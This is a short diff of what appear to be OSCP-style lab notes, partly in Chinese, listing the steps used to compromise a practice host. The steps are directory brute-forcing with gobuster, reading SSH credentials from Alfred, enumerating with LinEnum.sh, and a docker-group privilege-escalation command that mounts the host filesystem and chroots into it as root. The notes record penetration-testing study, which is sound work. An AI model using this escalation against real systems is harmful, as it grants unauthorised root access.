@@ -8,7 +8,7 @@ gobuster dir  -u http://oscp.thinc.local/  -w /usr/share/dirb/wordlists/common.t
 3.alfred可以成功登入並看到ssh密碼
 4.ssh登入後取得shell,使用LinEnum.sh查看是docker的group用戶
 5.google docker privilege escalation
-docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+docker run -v /:/mnt -it alpine chroot /mnt sh
 
 Administrator:
 Name: Walter
